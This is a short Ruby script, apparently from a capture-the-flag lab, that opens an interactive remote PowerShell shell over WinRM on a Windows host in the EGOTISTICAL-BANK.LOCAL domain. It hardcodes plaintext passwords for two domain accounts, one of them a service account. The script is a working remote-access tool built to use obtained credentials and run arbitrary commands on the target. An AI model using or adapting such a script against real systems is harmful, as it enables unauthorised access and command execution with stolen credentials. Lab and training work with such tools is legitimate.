# This script spawns a shell on the remote machine
# You must first install Windows Remote Management (WinRM) for Ruby
# gem install -r winrm
# https://github.com/WinRb/WinRM

# load the winrm library 
require 'winrm'

# define the options that will be used in the in the connection
conn = WinRM::Connection.new( 
  endpoint: 'http://10.10.10.175:5985/wsman',
  #user: 'EGOTISTICAL-BANK.LOCAL\FSmith',
  #password: 'Thestrokes23',
  user: 'EGOTISTICAL-BANK.LOCAL\svc_loanmgr',
  password: 'Moneymakestheworldgoround!',
  # transport: :ssl #https
)

# do not send any command upon connection
command=""


conn.shell(:powershell) do |shell| # use conn.shell(:cmd) for cmd.exe
    until command == "exit\n" do
        print "PS > "
        command = gets        
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end    
    puts "Exiting with code #{output.exitcode}"
end
